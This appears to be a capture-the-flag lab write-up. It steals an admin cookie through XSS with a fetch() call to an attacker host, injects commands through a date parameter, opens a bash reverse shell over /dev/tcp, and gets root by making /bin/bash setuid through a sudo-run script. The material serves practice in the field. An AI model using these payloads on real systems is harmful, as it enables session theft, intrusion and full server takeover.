# headless-reference

On intercepting the request, we see a cookie called **is_admin**. Putting it through the decoder, we find that there is the word "user" along with some random gibberish.

So, let's try and get this cookie via xss.

The message atrribute can be separated by a semicolon like this with the payload:<br>
`message=random;<img src=x onerror=fetch('http://<YourIP>/?c='+document.cookie);>`

Start a http server with the address as `<YourIP>` and the run this a couple of times to get the requests.

The captured payload looks like this <br/>
`GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`

By pasting the value of is_admin in place of the original, we get the admin dashboard.

I have setup the proxy with a *match and replace* rule so that it will automatically replace the is_admin parameter with the stolen credentials.

Now in the admin dashboard, when we intercept the request, we see a parameter date.<br>
`date=2023-09-15`

We can malform this by doing<br>
`date=2023-09-15;whoami`

This allows for code execution on the server.

Let's spawn a reverse shell
payload:<br>
`date=2023-09-15;/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.21/4444+0>%261'`

Possible PE vector:
/usr/bin/python3 /home/dvir/app/inspect_reports.py

Now the actual PE vector can be found by running sudo -l.

This will reveal a file called `/usr/bin/syscheck`.

By running cat /usr/bin/syscheck, we can see that it runs a file called initdb.sh as root.

Therefore, we can do this:

```bash
echo "chmod u+s /bin/bash" > initdb.sh
```

This command will create a file called **initdb.sh** with the contents, *chmod u+s /bin/bash*.

Basically what this chmod command does is that it runs the setuid bit on the /bin/bash program through syscheck. Since syscheck has root perms, we're using it to give ourselves the root shell, since the chmod command in this case, will give the bash file root perms, since root is the owner.

run /usr/bin/syscheck as follows after running the above command
```bash
sudo /usr/bin/syscheck
```

After that run bash

```bash
/bin/bash -p
```

We're root now.
Get the flag

